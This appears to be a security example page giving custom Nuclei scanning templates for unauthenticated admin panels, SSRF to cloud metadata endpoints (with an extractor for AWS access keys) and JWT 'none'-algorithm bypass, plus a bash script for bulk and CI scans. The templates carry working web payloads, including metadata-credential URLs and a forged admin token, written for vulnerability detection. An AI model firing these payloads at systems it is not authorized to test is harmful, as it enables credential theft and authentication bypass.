---
type: example
title: "Custom Nuclei Vulnerability Template"
---

# Custom Nuclei Vulnerability Template

## Context
When you need to scan for organization-specific vulnerabilities or verify custom security misconfigurations at scale. Nuclei templates let you codify security checks as YAML and run them against thousands of targets in seconds.

## Code/Template

```yaml
# nuclei-templates/custom/exposed-admin-panel.yaml
id: exposed-admin-panel
info:
  name: Exposed Admin Panel Without Auth
  author: security-team
  severity: critical
  description: |
    Detects admin panels accessible without authentication.
    These panels often expose sensitive configuration, user data,
    or allow unauthorized system changes.
  tags: admin,exposure,misconfig
  classification:
    cwe-id: CWE-306
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
  metadata:
    max-request: 5

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/admin/dashboard"
      - "{{BaseURL}}/_admin"
      - "{{BaseURL}}/management"
      - "{{BaseURL}}/internal/admin"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "admin"
          - "dashboard"
          - "management"
        condition: or
        part: body

      # Confirm it's not a login page (which would be expected)
      - type: word
        words:
          - "login"
          - "sign in"
          - "password"
        negative: true
        part: body
        condition: and
```

```yaml
# nuclei-templates/custom/ssrf-internal-metadata.yaml
id: ssrf-metadata-endpoint
info:
  name: SSRF to Cloud Metadata Endpoint
  author: security-team
  severity: critical
  description: |
    Tests for Server-Side Request Forgery allowing access to
    cloud instance metadata (AWS/GCP/Azure). Successful exploitation
    can leak IAM credentials and service account tokens.
  tags: ssrf,aws,gcp,cloud
  classification:
    cwe-id: CWE-918
    cvss-score: 9.8

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/proxy?url=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/api/fetch?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      - "{{BaseURL}}/redirect?to=http://metadata.google.internal/computeMetadata/v1/"

    headers:
      Metadata-Flavor: "Google"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "ami-id"
          - "instance-id"
          - "iam"
        part: body
        condition: or

      - type: word
        words:
          - "access_token"
          - "service-accounts"
        part: body
        condition: or

    extractors:
      - type: regex
        regex:
          - '"AccessKeyId"\s*:\s*"(AKIA[A-Z0-9]+)"'
        group: 1
```

```yaml
# nuclei-templates/custom/jwt-none-algorithm.yaml
id: jwt-none-algorithm
info:
  name: JWT None Algorithm Bypass
  author: security-team
  severity: high
  description: |
    Tests if the API accepts JWTs signed with the 'none' algorithm,
    bypassing signature verification entirely.
  tags: jwt,auth,bypass
  classification:
    cwe-id: CWE-327

http:
  - raw:
      - |
        GET /api/v1/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6OTk5OTk5OTk5OX0.

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '"role"'
          - '"email"'
          - '"user"'
        condition: or
        part: body

      # Ensure it's not an error response
      - type: word
        words:
          - "unauthorized"
          - "invalid token"
          - "forbidden"
        negative: true
        part: body
        condition: and
```

```bash
#!/usr/bin/env bash
# Run custom templates against targets
set -euo pipefail

# Scan single target
nuclei -u https://app.example.com \
  -t nuclei-templates/custom/ \
  -severity critical,high \
  -output results.json \
  -jsonl

# Scan multiple targets from recon
nuclei -l targets.txt \
  -t nuclei-templates/custom/ \
  -rate-limit 50 \
  -concurrency 10 \
  -output findings.json \
  -jsonl \
  -silent

# CI integration: fail on critical findings
CRITICAL_COUNT=$(nuclei -u "$TARGET_URL" \
  -t nuclei-templates/custom/ \
  -severity critical \
  -silent -jsonl | wc -l)

if [ "$CRITICAL_COUNT" -gt 0 ]; then
  echo "FAIL: $CRITICAL_COUNT critical findings"
  exit 1
fi
```

## Key Points
- Use `negative: true` matchers to reduce false positives—confirm the response is NOT a login page, NOT an error
- Include CWE and CVSS metadata for automatic triage integration with vulnerability management platforms
- Rate-limit scans (`-rate-limit`) against production; aggressive scanning can trigger WAF blocks or cause availability issues
